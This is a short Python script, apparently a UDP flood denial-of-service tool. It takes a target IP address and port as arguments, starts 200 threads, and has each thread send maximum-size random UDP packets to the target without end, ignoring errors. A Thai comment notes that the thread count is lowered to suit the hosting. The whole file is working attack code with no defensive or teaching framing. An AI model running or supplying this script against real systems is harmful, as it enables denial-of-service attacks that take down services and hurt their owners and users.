import sys
import socket
import threading
import os

if len(sys.argv) < 3:
    sys.exit()

TARGET_IP   = sys.argv[1]
TARGET_PORT = int(sys.argv[2])
THREADS     = 200          # ลดให้ hosting รับได้
PACKET_SIZE = 65507        # max UDP payload

def attack():
    sock    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
    payload = os.urandom(PACKET_SIZE)
    while True:
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass

for i in range(THREADS):
    t = threading.Thread(target=attack, daemon=True)
    t.start()

import time
while True:
    time.sleep(1)
